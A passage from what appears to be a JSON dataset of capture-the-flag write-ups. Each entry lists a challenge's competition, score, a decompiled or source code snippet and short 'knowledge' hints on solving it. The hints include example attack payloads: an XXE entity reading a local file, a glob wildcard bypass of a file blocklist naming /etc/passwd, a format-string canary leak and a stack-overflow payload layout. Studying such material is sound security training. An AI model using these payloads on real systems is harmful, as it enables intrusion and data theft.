        "key": "```c\nint local_9c;  \nchar local_76 [10];  \nchar local_6c [10];  \nchar local_62 [10];  \nchar local_58 [56];  \nlong local_20;\n\ndo {  \n   sVar8 = strlen(local_76);  \n   if (sVar8 <= (ulong)(long)local_9c) {  \n     iVar4 = atoi(local_76);  \n     iVar5 = atoi(local_6c);  \n     iVar6 = atoi(local_62);  \n     if (uVar1 == iVar5 + iVar4) {  \n       if (uVar2 == iVar6 + iVar5) {  \n         if (uVar3 == iVar4 + iVar6) {  \n           __stream = fopen(\"flag.txt\",\"r\");  \n           if (__stream == (FILE *)0x0) {  \n             fwrite(\"\\nflag.txt doesn\\'texist.\\n\",1,0x19,stderr);  \n             exit(0);  \n           }  \n           fgets(local_58,0x32,__stream);  \n           printf(\"That\\'s yummy.... Here is yourgift:\\n%s\",local_58);  \n         }  \n         else {  \n           fail();  \n         }  \n       }  \n       else {  \n         fail();  \n       }  \n     }  \n     else {  \n       fail();  \n     }  \n```\n\n```c\ntVar7 = time((time_t *)0x0);  \nsrand((uint)tVar7);  \niVar4 = rand();  \nuVar1 = (iVar4 % 10000) * -2;  \niVar4 = rand();  \nuVar2 = (iVar4 % 10000) * -2;  \niVar4 = rand();  \nuVar3 = (iVar4 % 10000) * -2;\n```\n\n```c\n__isoc99_scanf(&DAT_00100de2,local_76);\n```"
    },
    {
        "name": "Ferman",
        "write_up": "dataset/raw/Ferman.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 134,
        "max_score": 477,
        "difficulty": 0.2809224318658281,
        "knowledge": [
            "In RSA challenges where additional information is provided that links prime factors \\(p\\) and \\(q\\) with a certain formula, one can factorize a derived number using its unique properties, like being a perfect power (e.g., seventh power of a number). This approach can be particularly useful when direct factorization of the RSA modulus \\(n\\) is impractical due to its size. Factors found in such a unique manner can then be used to compute \\(p\\) and \\(q\\).",
            "If the challenge involves complex numbers or operations that are not solvable in the real number domain, transform the problem into the complex number domain (\\(\\mathbb{Z}[i]\\)), where \\(i\\) is the imaginary unit. Factoring in the complex domain, specifically Gaussian integers for equations involving \\(x^2 + y^2\\), can provide prime factors when the RSA modulus \\(n\\) is composed of primes that relate to complex-number-based equations. This method is especially effective when the problem includes equations of the form \\(x^2 + y^2 = z^t\\) where \\(t\\) is an integer.\n\nSample Python code snippet demonstrating factorization and prime extraction:\n```python\nfrom sympy.ntheory import isprime\n\n# Assuming w is the integer derived from the challenge\nw = 24007015341450638047707811509679207068051724063799752621201994109462561550079479155110637624506028551099549192036601169213196430196182069103932872524092047760624845002308713558682251660517182097667675473038586407097498167776645896369165963981698265040400341878755056463554861788991872633206414266159558715922583613630387512303492920597052611976890648632123534922756985895479931541478630417251021677032459939450624439421018438357005854556082128718286537575550378203702362524442461229\n\na, b = 2265, 902\nz = w ** (1/7)\n\n# Factor z in the Gaussian integer domain\ngaussian_factors = factor(ZZ[i](z))\n\n# Find the divisors that correspond to p and q\n# (Simplified example, actual calculations would involve iterating through factors)\nz_test = (-1236649975237776943493190425869173*I - 3575914522629734831030006136433790)*(4*I + 5)\nx_test, y_test = abs(z_test.real), abs(z_test.imag)\n\np, q = x_test + a, y_test + b\n\nassert is_prime(p) and is_prime(q)\n```\nThis code snippet demonstrates the conceptual approach to using complex factorization and adjusting with given offsets \\(a\\) and \\(b\\) to find \\(p\\) and \\(q\\)."
        ],
        "key": "```python\ne = 65537  \nisPrime(p) = True  \nisPrime(q) = True  \nn = p * q  \n(p - 127)**2 + (q - 184)**2 =\n13809252727788824044233595548226590341967726502046327883413398709726819135921363848617960542444505497356040393690402758557636039683075007984614264314802550433942617885990971202110511768121760826488944622697964930982921462840320850014092598270493079542993367042001339267321218767132063176291998391714014192946596879176425904447127657664796094937171819714510504836456988487840790317576922986001688147359646287894578550322731904860694734616037751755921771706899493873123836562784063321  \nm = bytes_to_long(flag)  \nc = pow(m, e, n)  \n```"
    },
    {
        "name": "fibinary",
        "write_up": "dataset/raw/fibinary.md",
        "type": "crypto",
        "competition": [
            "corCTF/2021",
            "https://ctftime.org/event/1364/tasks/"
        ],
        "score": 205,
        "max_score": 500,
        "difficulty": 0.41,
        "knowledge": [
            "In a challenge dealing with custom encryption methods that utilize mathematical sequences or functions, one can reverse the encryption by understanding how the sequence is applied in the encryption process. In the provided scenario, the encryption uses Fibonacci numbers to convert characters to a binary representation based on whether their ASCII values are greater than or equal to specific Fibonacci numbers. To decrypt, iterate through each bit of the encrypted data block, adjusting the lower and upper bounds based on the presence of '1' or '0'. This method allows you to precisely pinpoint the ASCII value of each character, which can then be converted back using the `chr()` function.",
            "When reversing the encryption process, especially with encryptions that map to a range of values (like Fibonacci in this context), maintaining two variables for lower and upper bounds helps in accurately determining the original value. As the algorithm iterates through the binary representation, these bounds are adjusted based on Fibonacci sequence checks. This approach can be applied universally across similar challenges where the encryption method involves sequences or conditions that map each character to a range of values. This technique is particularly useful when the encryption process involves comparisons that result in a binary or similar finite representation of data. \n\nExample payload for reversing the binary representation to the original ASCII character based on Fibonacci series encryption:\n```\nlower=0\nupper=0\nfor b,i in zip(blo, range(10,-1,-1)):  \n    if b == '1':  \n        lower += fib[i]  \n    # No need for else part to modify upper since it's not used explicitly in final calculation\nchr(lower)  # This gives the original character from the binary representation\n```"
        ],
        "key": "```python\nfib = [1, 1]  \nfor i in range(2, 11):  \n    fib.append(fib[i - 1] + fib[i - 2])\n\ndef c2f(c):  \n    n = ord(c)  \n    b = ''  \n    for i in range(10, -1, -1):  \n        if n >= fib[i]:  \n            n -= fib[i]  \n            b += '1'  \n        else:  \n            b += '0'  \n    return b\n\nflag = open('flag.txt', 'r').read()  \nenc = ''  \nfor c in flag:  \n    enc += c2f(c) + ' '  \nwith open('flag.enc', 'w') as f:  \n    f.write(enc.strip())\n```"
    },
    {
        "name": "file reader",
        "write_up": "dataset/raw/file reader.md",
        "type": "web",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 459,
        "max_score": 1000,
        "difficulty": 0.459,
        "knowledge": [
            "To bypass file path restrictions in Python applications using `glob.glob` function, utilize shell-style wildcards to match the desired file if direct access is blocked. This method exploits the pattern matching capability of `glob` to complete patterns that can match filenames on the system where `*` represents any sequence of characters. Example payload: `/flag.tx*`.",
            "In web applications vulnerable to XXE (XML External Entity) through file uploads, manipulate internal XML files of supported formats (e.g., DOCX) to inject malicious entities. Altering XML content to include external entities or payloads can force the application to disclose information, such as file contents. This requires crafting or modifying an XML file within the uploaded document that includes the malicious payload. Example payload in DOCX `app.xml` to retrieve external data:\n```xml\n<!ENTITY xx SYSTEM \"file:///flag.txt\">\n<Pages>&xx;;</Pages>\n```"
        ],
        "key": "```python  \nimport glob\n\nblocked = [\"/etc/passwd\", \"/flag.txt\", \"/proc/\"]\n\ndef read_file(file_path):  \n   for i in blocked:  \n       if i in file_path:  \n               return \"you aren't allowed to read that file\"  \n  \n   try:  \n       path = glob.glob(file_path)[0]  \n   except:  \n       return \"file doesn't exist\"  \n  \n   return open(path, \"r\").read()\n\nuser_input = input(\"> \")  \nprint(read_file(user_input))  \n```"
    },
    {
        "name": "File_Size_Matter_Not",
        "write_up": "dataset/raw/File_Size_Matter_Not.md",
        "type": "forensics",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 495,
        "max_score": 1000,
        "difficulty": 0.495,
        "knowledge": [
            "When dealing with forensics challenges that involve analyzing a file with unknown content or format, `binwalk` is a useful tool to identify and extract embedded data within the file. This approach is particularly effective in scenarios where the file's structure is non-standard or when looking for hidden elements in the file's binary data. This extraction process can reveal hidden files and metadata that are essential for progressing in the challenge.\n   - Example command: `binwalk -e filename`",
            "For forensics challenges that result in a collection of fragmented files without clear headers or that appear to be parts of a larger file, concatenating these files in the correct order can be a crucial step toward reconstructing the original file. This is especially relevant when the file fragments do not start with recognizable headers, indicating they are middle or end pieces of a complete file. The Unix `cat` command can be utilized for this purpose to sequentially combine these files into a single file, which can then be further examined or utilized as needed.\n   - Example command for concatenation: `cat file1 file2 > resultfile`"
        ],
        "key": "```python\ndef extract_zip(file_path, password):\n    import zipfile\n    with zipfile.ZipFile(file_path) as zf:\n        zf.extractall(pwd=password.encode())\n\nextract_zip('hard_drive', 'baby_but_strong')\n```"
    },
    {
        "name": "Finches in a Stack",
        "write_up": "dataset/raw/Finches in a Stack.md",
        "type": "pwn",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 350,
        "max_score": 700,
        "difficulty": 0.5,
        "knowledge": [
            "When encountering a format string vulnerability, it's possible to leak critical information such as stack canary values by specifying the correct offset in the format string payload. This technique can be applied by using a payload that includes `%[offset]$p` to read values from the stack. Condition: This knowledge is applicable in scenarios where the application prints back user input without proper formatting, potentially leading to information disclosure.\nExample payload: `%11$p` to leak the canary value at the 11th position on the stack.",
            "In instances of stack buffer overflow vulnerabilities with stack canary protection enabled, and when the location of the `flag` function or critical function is known (for example, when PIE is not enabled), the exploit strategy can include leaking the canary value first and then crafting a payload that overwrites the return address with the desired function's address. The payload will have to include the correct padding up to the canary, the canary itself to bypass the stack canary protection, additional padding to the return address, and finally, the address of the function that needs to be executed.\nExample payload construction for bypassing the canary and executing a specific function: `b\" \"*offset_canary + p32(canary) + b\" \"*offset_ret + p32(function_address)`."
        ],
        "key": "```c\nvoid say_hi(void)  \n{  \n char cVar1;  \n uint uVar2;  \n char *pcVar3;  \n int in_GS_OFFSET;  \n byte bVar4;  \n char local_29 [4];  \n undefined2 uStack37;  \n undefined local_22 [18];  \n int local_10;  \n  \n bVar4 = 0;  \n local_10 = *(int *)(in_GS_OFFSET + 0x14);  \n printf(\"Hi! What\\'s your name? \");  \n gets((char *)((int)&uStack37 + 1));  \n printf(\"Nice to meet you, \");  \n uVar2 = 0xffffffff;  \n pcVar3 = (char *)((int)&uStack37 + 1);  \n do {  \n   if (uVar2 == 0) break;  \n   uVar2 = uVar2 - 1;  \n   cVar1 = *pcVar3;  \n   pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;  \n } while (cVar1 != '\\0');  \n *(undefined2 *)((int)&uStack37 + ~uVar2) = 0xa21;  \n *(undefined *)((int)&uStack37 + ~uVar2 + 2) = 0;  \n printf((char *)((int)&uStack37 + 1));  \n puts(\"Do YOU want to pet my canary?\");  \n gets(local_29);  \n if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {  \n   __stack_chk_fail_local();  \n }  \n return;  \n}  \n```"
    },
    {
        "name": "Finding Artifacts 1",
        "write_up": "dataset/raw/Finding Artifacts 1.md",
        "type": "misc",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When faced with challenges that require identifying specific artifacts or locations based on clues, utilizing search engines with carefully crafted queries can lead to successful identification. For instance, combining specific keywords from the clues (\"bronze statue starting with 'ma'\" + \"prevalent in southern Asia\") can filter out irrelevant information and pinpoint the required details effectively.",
            "In challenges where the task involves finding a physical location based on the identified artifact, a subsequent focused search query that includes the artifact's name and the specific details such as the city or type of location (\"Maitreya Buddha statue museum New York City\") can efficiently direct to the exact place housing the artifact. This approach prioritizes precision in search parameters to narrow down results."
        ],
        "key": "```python\ndef find_statue_location(statue_name, city):\n    # Simulated database of statues and their locations\n    statue_database = {\n        \"Maitreya Buddha\": \"Rubin Museum of Art\",\n        \"Statue of Liberty\": \"Liberty Island\",\n        \"David\": \"Metropolitan Museum of Art\"\n    }\n    \n    # Check if the statue is in the database\n    if statue_name in statue_database:\n        location = statue_database[statue_name]\n        if city in location:\n            return location\n    return \"Statue not found in the specified city.\"\n\n# Example usage\nstatue_name = \"Maitreya Buddha\"\ncity = \"New York City\"\nprint(find_statue_location(statue_name, city))\n```\n"
    },
    {
        "name": "Fire in the Androiddd",
        "write_up": "dataset/raw/Fire in the Androiddd.md",
        "type": "reverse",
        "competition": [
            "darkCON/2021",
            "https://ctftime.org/event/1250/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "In challenges where Android applications are analyzed for vulnerabilities, particularly those involving receiving intents, checking the `AndroidManifest.xml` is crucial. It provides detailed information about the components of the application and their properties. For instance, if the `android:exported` attribute of a component is set to true, this implies that the component is accessible by any other application, making it a target for intent-based attacks. To exploit such vulnerabilities, one can use the `adb shell am broadcast` command to send an intent to the application. This technique allows for interaction with the application's components directly from the command line, bypassing the user interface. Example payload: `adb shell am broadcast -a flag_checker -n com.application.darkcon/.MyReceiver --es flag \"your_flag_here\"`",
            "In scenarios involving native libraries in Android applications, particularly for checking flags or performing specific calculations, reverse engineering with tools like Ghidra can uncover the logic behind native functions. Many CTF challenges involve algorithms that generate sequences or perform mathematical operations, which can be critical in decrypting or crafting payloads. For example, discovering a function generates Catalan numbers could lead to understanding the logic required to generate the correct input or flag. To bypass mathematical operations or sequence generation that involve integer overflow, it may be necessary to replicate the algorithm in a higher-level language, accommodating for large numbers or overflow behavior. This approach enables the crafting of inputs that comply with the application's validation mechanism. Sample demonstration snippet in C for a Catalan number generator and Python for applying XOR operations and handling overflows correctly illustrates how to combine reverse-engineered logic and scripting to obtain a flag."
        ],
        "key": "```java  \npackage com.application.darkcon;\n\nimport android.content.BroadcastReceiver;  \nimport android.content.Context;  \nimport android.content.Intent;  \nimport android.os.AsyncTask;  \nimport android.widget.Toast;\n\npublic class MyReceiver extends BroadcastReceiver {  \n   @Override  \n   public void onReceive(Context context, Intent intent) {  \n       String data =  intent.getStringExtra(\"flag\");\n\n       if(data_receiver.data != null && data != null){  \n           new loader(context).execute(data,data_receiver.data);  \n       }else{  \n           Toast.makeText(context, \"Something went wrong\", Toast.LENGTH_LONG).show();  \n       }  \n   }\n\n   class loader extends AsyncTask<String,Void,Boolean> {  \n       Context context;\n\n       public loader(Context context){  \n           this.context = context;  \n       }  \n       @Override  \n       protected void onPreExecute() {  \n           super.onPreExecute();  \n           Toast.makeText(context, \"Checking your flag\", Toast.LENGTH_SHORT).show();  \n       }\n\n       @Override  \n       protected Boolean doInBackground(String... strings) {  \n           String[] parts = strings[1].split(\",\");  \n           long[] ints = new long[parts.length];  \n           for (int i = 0; i < parts.length; i++)ints[i] = Long.parseLong(parts[i]);  \n           return magic(strings[0].getBytes(),ints);  \n       }\n\n       @Override  \n       protected void onPostExecute(Boolean aBoolean) {  \n           if(aBoolean){  \n               Toast.makeText(context, \"Well thats the correct flag \", Toast.LENGTH_SHORT).show();  \n           }else{  \n               Toast.makeText(context, \"Nope wrong flag :(\", Toast.LENGTH_SHORT).show();  \n           }\n\n       }  \n   }  \n   static {  \n       System.loadLibrary(\"native-lib\");  \n   }  \n   public native boolean magic(byte[] str,long[] str1);  \n}\n```\n\n```java  \npublic class data_receiver {  \n   public static String data;\n\n   public void getData() {\n\n       FirebaseFirestore firebaseFirestore = FirebaseFirestore.getInstance();  \n       firebaseFirestore.collection(\"encryption\").get().addOnFailureListener(new OnFailureListener() {  \n           @Override  \n           public void onFailure(@NonNull Exception e) {  \n               data = null;  \n           }  \n       }).addOnCompleteListener(new OnCompleteListener<QuerySnapshot>() {  \n           @Override  \n           public void onComplete(@NonNull Task<QuerySnapshot> task) {  \n               if(task.isSuccessful()){  \n                   QuerySnapshot snapshot = task.getResult();  \n                   for(DocumentSnapshot snapshot1 : snapshot){  \n                       data = snapshot1.getString(\"encrypted_flag\");  \n                   }  \n               }  \n           }  \n       });  \n   }  \n}  \n```\n\n```c  \nuint Java_com_application_darkcon_MyReceiver_magic  \n              (_JNIEnv *param_1,undefined4 param_2,_jarray *param_3,_jarray *param_4)\n\n{  \n char cVar1;  \n uint uVar2;  \n uint uVar3;  \n int iVar4;  \n int iVar5;  \n int iVar6;  \n uint uVar7;  \n uint local_2c;  \n byte local_15;  \n  \n iVar4 = GetArrayLength(param_1,param_3);  \n iVar5 = GetArrayLength(param_1,param_4);  \n if (iVar4 == iVar5) {  \n   iVar5 = GetByteArrayElements(param_1,(_jbyteArray *)param_3,(uchar *)0x0);  \n   iVar6 = GetLongArrayElements(param_1,(_jlongArray *)param_4,(uchar *)0x0);  \n   local_2c = 0;  \n   while ((int)local_2c < iVar4) {  \n     uVar2 = *(uint *)(iVar6 + local_2c * 8);  \n     uVar3 = *(uint *)(iVar6 + 4 + local_2c * 8);  \n     cVar1 = *(char *)(iVar5 + local_2c);  \n     uVar7 = looper(local_2c);  \n     if ((uVar2 ^ (int)cVar1 ^ uVar7 | uVar3) != 0) {  \n       local_15 = 0;  \n       goto LAB_0001871b;  \n     }  \n     local_2c = local_2c + 1;  \n   }  \n   local_15 = 1;  \n }  \n else {  \n   local_15 = 0;  \n }  \nLAB_0001871b:  \n return (uint)local_15;  \n}  \n```\n\n```c  \n{  \n int iVar1;  \n int in_GS_OFFSET;  \n int aiStack64 [3];  \n int local_34;  \n int *local_30;  \n undefined **local_2c;  \n int local_28;  \n uint local_24;  \n int local_20;  \n int *local_1c;  \n int local_18;  \n  \n local_1c = aiStack64;  \n local_2c = &__DT_PLTGOT;  \n local_18 = *(int *)(in_GS_OFFSET + 0x14);  \n local_20 = param_1 + 1;  \n iVar1 = -(param_1 * 4 + 0x13 & 0xfffffff0);  \n local_30 = (int *)((int)aiStack64 + iVar1);  \n *(undefined4 *)((int)aiStack64 + iVar1 + 4) = 1;  \n *local_30 = 1;  \n local_24 = 2;  \n while (local_24 <= param_1) {  \n   local_30[local_24] = 0;  \n   local_28 = 0;  \n   while (local_28 < (int)local_24) {  \n     local_30[local_24] =  \n          local_30[local_28] * local_30[(local_24 - local_28) + -1] + local_30[local_24];  \n     local_28 = local_28 + 1;  \n   }  \n   local_24 = local_24 + 1;  \n }  \n local_34 = local_30[param_1];  \n if (*(int *)(in_GS_OFFSET + 0x14) == local_18) {  \n   return local_34;  \n }  \n *(undefined4 *)((undefined *)local_1c + -4) = 0x18961;  \n __stack_chk_fail();  \n}  \n```"
    },
    {
        "name": "first hunt",
        "write_up": "dataset/raw/first hunt.md",
        "type": "web",
        "competition": [
            "snakeCTF/2023",
            "https://ctftime.org/event/2158/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with challenges that involve intercepting or analyzing messages, it's critical to consider encoding methods that might be employed to conceal or transmit data. In scenarios where a message is encoded, decoding it may reveal hints or direct instructions for the next steps. For instance, if a BASE64 encoded message is identified, using a decoding tool or website to revert it to its original form could unveil useful information, such as URLs, credentials, or further instructions.  \nExample action: Use a BASE64 decoding tool or command-line utility like `base64 -d` in Linux to decode the message.",
            "In challenges where an encoded message points to an external resource or website, the username or identifier found within the message can lead to hidden data or accounts relevant to solving the challenge. Specifically, when a username is mentioned, services or websites where users commonly post content, such as Pastebin, GitHub, or social media platforms, should be searched for accounts matching the provided username. This method relies on the assumption that challenge creators might simulate real-world scenarios where individuals share or leak information online.   \nExample action: Search for the username on popular websites or platforms such as Pastebin (`https://pastebin.com/u/[username]`) to find hidden or associated posts that might contain further clues or credentials needed to progress in the challenge."
        ],
        "key": "```python\nimport base64\n\ndef decode_email(encoded_email):\n    try:\n        decoded_bytes = base64.b64decode(encoded_email)\n        decoded_message = decoded_bytes.decode('utf-8')\n        return decoded_message\n    except Exception as e:\n        return str(e)\n\n# Example of a base64 encoded email\nencoded_email = \"U29tZSBlbmNvZGVkIG1lc3NhZ2UgaGVyZQ==\"\ndecoded_message = decode_email(encoded_email)\nprint(decoded_message)\n```\n"
    },
    {
        "name": "Flag SP-network",
        "write_up": "dataset/raw/Flag SP-network.md",
        "type": "reverse",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing an encryption algorithm that involves key expansion from a smaller key and repetitive operations like byte rotation and XOR for each block of data, the decryption process can often be approached by reversing these operations one step at a time. Specifically, if the encryption uses round keys generated by simply rotating the original key and XOR operations for encryption, decryption can be achieved by applying the inverse operations in reverse order, using the round keys in the opposite sequence. This approach is particularly effective when the encryption scheme provides a bijective (one-to-one and onto) mapping between input and output values, as demonstrated by a substitution lookup table (`lut`) that has a unique output for every unique input. To construct a decryption function, one needs to invert the key operations (such as using the original keys in reversed order for XOR) and reverse engineer any substitution functions by using an inverted lookup table. This method is conditioned on being able to isolate and invert each step of the encryption process based on understanding its components, such as the key expansion, block processing, and substitution mechanisms used.",
            "For encryption algorithms where the key is relatively small or follows a predictable pattern (e.g., two random bytes repeated multiple times to form a larger key), a brute-force approach to discover the key is feasible. This is because the effective keyspace is significantly reduced, making it practical to iterate through all possible combinations of the key components. In the scenario where the key consists of two bytes repeated to form an 8-byte key, there are only \\(256^2\\) or 65,536 possible keys to test, which is computationally manageable on modern hardware. This approach requires that the decryptor knows or can guess a pattern in the plaintext (such as the plaintext starting with a known sequence like \"flag\") to verify when the correct key has been found. Utilizing this pattern as a condition for stopping the brute-force search can efficiently lead to the discovery of the correct decryption key, thus revealing the encrypted information. \n\nExample payload for attempting decryption with every key possibility:\n```python\nfor x in range(256):\n    for y in range(256):\n        candidate_key = [x, y] * 4\n        try:\n            decrypted_text = decrypt(ciphertext, candidate_key)\n            if decrypted_text.startswith(\"flag\"):\n                print(f'Found flag: {decrypted_text}')\n                break\n        except Exception as e:\n            continue\n```"
        ],
        "key": "```python\ndef r(p, k):  \n   ## 1.  \n   keys = ks(k)  \n   ## 2.  \n   state = str_split(p)  \n   ## 3.  \n   for b in range(len(state)):  \n       ## 4.  \n       for i in range(rounds):  \n           ## 5. Core of the encryption  \n           rk = kx(to_ord(state[b]), keys[i])  \n           state[b] = to_chr(en(to_chr(rk)))  \n   return [ord(e) for es in state for e in es]  \n\ndef ks(key):\n    return [key[i:] + key[:i] for i in range(len(key))]\n\ndef kx(a, b):\n    return a ^ b\n\ndef en_core(c):  \n   a, b = bin_split(to_bin(ord(c)))  \n   sa, sb = s(to_int(a), to_int(b))  \n   pe = p(  \n       bin_join((to_bin(sa, int(block_size / 2)), to_bin(sb, int(block_size / 2))))  \n   )  \n   return to_int(pe)\n\nen_lut = {  \n   x: en_core(x) for x in range(256)  \n}\n\ndef en(c):\n    return en_lut[ord(c)]\n```"
    },
    {
        "name": "FlagConverter Part 3",
        "write_up": "dataset/raw/FlagConverter Part 3.md",
        "type": "forensics",
        "competition": [
            "CCCamp/2019",
            "https://ctftime.org/event/854/tasks/"
        ],
        "score": 338,
        "max_score": 500,
        "difficulty": 0.676,
        "knowledge": [
            "When dealing with memory dumps in forensics challenges, the first approach should be identifying the nature of the dump and the operating system it belongs to using tools like `imageinfo` in Volatility. This establishes a base understanding of the environment, guiding subsequent analysis steps such as process listing, clipboard contents examination, file scanning, and screenshot extraction. Example command: `volatility -f flagchecker.dmp imageinfo`.",
            "In encryption-related challenges, especially when dealing with AES encryption, analyzing the application's source code can reveal the encryption method, key, and IV generation logic. If the key and IV are derived from known or predictable information (e.g., SID in Windows environments), this information can be utilized to recreate the encryption environment and decrypt the ciphertext. A hybrid approach, combining understanding of .NET decompilation to analyze the encryption implementation with tools like dotPeek and applying cryptographic libraries in Python for decryption, can be particularly effective. A decryption sample in Python would be:\n   ```python\n   from Crypto.Cipher import AES\n   key = b'<key derived from analysis>'  # Hex string converted to bytes\n   IV = b'<IV derived from analysis>'    # Hex string converted to bytes\n   cipher_text = b'<base64 decoded cipher text>'\n   mode = AES.MODE_CBC\n   decryptor = AES.new(key, mode, IV=IV)\n   plain_text = decryptor.decrypt(cipher_text).rstrip(b\"\\x00\")\n   print(plain_text.decode('utf-8'))\n   ```"
        ],
        "key": "```c#\nprivate void Click_Button(object sender, EventArgs e)  \n{  \n    Crypto crypto = new Crypto();  \n    crypto.function03();  \n    this.string_0 = Convert.ToBase64String(crypto.function02(this.text.Text));  \n    crypto.Dispose();  \n    GC.Collect();  \n    GC.WaitForPendingFinalizers();  \n    this.ms.Read(Encoding.ASCII.GetBytes(this.string_0), 0, Encoding.ASCII.GetBytes(this.string_0).Length);  \n    this.text.Text = this.string_0;  \n}  \n\npublic byte[] function02(string string_0)  \n{  \n    SymmetricAlgorithm symmetricAlgorithm = this.function01();  \n    MemoryStream memoryStream = new MemoryStream();  \n    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write);  \n    byte[] bytes = new UnicodeEncoding().GetBytes(string_0.PadRight(string_0.Length % 8, char.MinValue));  \n    cryptoStream.Write(bytes, 0, bytes.Length);  \n    cryptoStream.FlushFinalBlock();  \n    memoryStream.Position = 0L;  \n    byte[] array = memoryStream.ToArray();  \n    string_0 = (string) null;  \n    cryptoStream.Close();  \n    memoryStream.Close();  \n    GC.Collect();  \n    GC.WaitForPendingFinalizers();  \n    return array;  \n}  \n\nprivate SymmetricAlgorithm function01()  \n{  \n    RijndaelManaged rijndaelManaged = new RijndaelManaged();  \n    rijndaelManaged.KeySize = 256;  \n    rijndaelManaged.IV = this.byte_1;  \n    rijndaelManaged.Key = this.byte_0;  \n    return (SymmetricAlgorithm) rijndaelManaged;  \n}  \n\npublic void function03()  \n{  \n    byte[] binaryForm = new byte[28];  \n    WindowsIdentity.GetCurrent().User.GetBinaryForm(binaryForm, 0);  \n    this.byte_1 = new byte[16];  \n    Array.Copy((Array) binaryForm, 0, (Array) this.byte_1, 0, 16);  \n    this.byte_0 = new byte[32];  \n    Array.Copy((Array) binaryForm, binaryForm.Length - 16, (Array) this.byte_0, 0, 16);  \n    Array.Copy((Array) binaryForm, binaryForm.Length - 16, (Array) this.byte_0, 16, 16);  \n}  \n```"
    },
    {
        "name": "flagrom",
        "write_up": "dataset/raw/flagrom.md",
        "type": "reverse",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 187,
        "max_score": 500,
        "difficulty": 0.374,
        "knowledge": [
            "When dealing with embedded systems like an 8051 board with SecureEEPROM interacting via the I2C protocol, if direct memory read operations are restricted due to security measures, manipulation of the I2C traffic can be a viable workaround. Specifically, initiating a sequence of I2C start conditions without corresponding stop conditions can be utilized to bypass secure memory read restrictions. This technique hinges on understanding and exploiting the state machine governing the I2C communication in the target device, allowing one to change the operation context (e.g., from write to read operation) without triggering security constraints that block access to sensitive data like flags.",
            "Crafting a custom payload to interact with hardware-specific features, such as directly controlling I2C SDA (Serial Data Line) and SCL (Serial Clock Line) lines, can be achieved by defining special function registers (SFR) in code and manipulating them accordingly. This approach requires a detailed understanding of both the target hardware architecture and the protocol used for communication. In scenarios where standard library functions or existing routines do not offer the required control or functionality, directly accessing and manipulating hardware registers can enable complex interactions with connected devices or peripherals, like sending partial byte sequences or artificially crafting protocol-specific conditions to access secured data areas.\n\nSample Payload Snippets for I2C Manipulation:\n\n```c\nvoid send_start(void) {  \n RAW_I2C_SCL = 0;  \n RAW_I2C_SDA = 1;  \n RAW_I2C_SCL = 1;  \n RAW_I2C_SDA = 0;  \n}\n\nvoid send_7bit(unsigned char byte) {  \n for (unsigned char i = 1; i < 7; i++) {  \n   RAW_I2C_SCL = 0;  \n   RAW_I2C_SDA = ((byte >> (7 - i)) & 1) != 0;  \n   RAW_I2C_SCL = 1;  \n }  \n}\n```"
        ],
        "key": "```c\nbool __fastcall sfr_i2c_module(void *emu, int access_type, int address_type,\nunsigned __int8 a4, unsigned __int8 *value)  \n{  \n bool result; // al  \n unsigned __int8 v7; // al  \n I2C_REG_BLOCK I2C; // [rsp+20h] [rbp-20h]  \n int direction; // [rsp+30h] [rbp-10h] MAPDST  \n int pos; // [rsp+34h] [rbp-Ch]  \n char success; // [rsp+3Bh] [rbp-5h]  \n int last_direction; // [rsp+3Ch] [rbp-4h]\n\n if ( access_type )  \n {  \n   if ( *value & 1 )  \n   {  \n     emu8051::mem_read(emu, 2LL, 0xFE00LL, &I2C, 16LL);  \n     if ( I2C.LENGTH <= 7u )  \n     {  \n       if ( I2C.LENGTH )  \n       {  \n         I2C.ADDR &= 0xFEu;  \n         last_direction = 0;  \n         success = 1;  \n         pos = 0;  \n         while ( I2C.LENGTH )  \n         {  \n           if ( ((signed int)I2C.RW_MASK >> pos) & 1 )  \n             direction = 2;  \n           else  \n             direction = 1;  \n           if ( direction != last_direction )  \n           {  \n             send_start(dev_i2c[0]);  \n             send_byte(dev_i2c[0], I2C.ADDR | (direction == 2));  \n             if ( !recv_ack(dev_i2c[0]) )  \n             {  \n               I2C.ERROR_CODE = 2;  \n               success = 0;  \n               break;  \n             }  \n             last_direction = direction;  \n           }  \n           if ( direction == 2 )  \n           {  \n             v7 = recv_byte(dev_i2c[0]);  \n             I2C.DATA[pos] = v7;  \n           }  \n           else  \n           {  \n             send_byte(dev_i2c[0], I2C.DATA[pos]);  \n           }  \n           if ( !recv_ack(dev_i2c[0]) )  \n           {  \n             I2C.ERROR_CODE = 3;  \n             success = 0;  \n             break;  \n           }  \n           --I2C.LENGTH;  \n           ++pos;  \n         }  \n         if ( success )  \n           I2C.ERROR_CODE = 0;  \n       }  \n       else  \n       {  \n         send_start(dev_i2c[0]);  \n         send_byte(dev_i2c[0], I2C.ADDR);  \n         if ( recv_ack(dev_i2c[0]) )  \n           I2C.ERROR_CODE = 0;  \n         else  \n           I2C.ERROR_CODE = 5;  \n       }  \n     }  \n     else  \n     {  \n       I2C.ERROR_CODE = 1;  \n     }  \n     send_stop(dev_i2c[0]);  \n     emu8051::mem_write(emu, 2LL, 65024LL, &I2C, 16LL);  \n     result = 1;  \n   }  \n   else  \n   {  \n     result = 1;  \n   }  \n }  \n else  \n {  \n   *value = 0;  \n   result = 1;  \n }  \n return result;  \n}\n```"
    },
    {
        "name": "Flags",
